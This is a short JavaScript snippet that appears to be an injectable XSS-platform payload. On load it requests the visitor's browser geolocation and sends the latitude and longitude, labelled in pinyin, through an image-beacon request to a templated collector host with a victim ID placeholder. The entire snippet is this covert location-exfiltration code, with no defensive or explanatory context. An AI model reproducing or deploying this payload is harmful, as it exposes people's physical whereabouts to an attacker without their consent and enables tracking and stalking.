function getLocation()
{
	if (navigator.geolocation)
	{
		navigator.geolocation.getCurrentPosition(showPosition);
	}else{
		x.innerHTML="Geolocation is not supported by this browser.";
	}
}

function showPosition(position)
  {
	alert("Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude);
    (new Image()).src='<-|HOST|->rev?id=<-|ID|->&value=weidu='+position.coords.latitude+'||||jingdu='+position.coords.longitude; 
}

getLocation();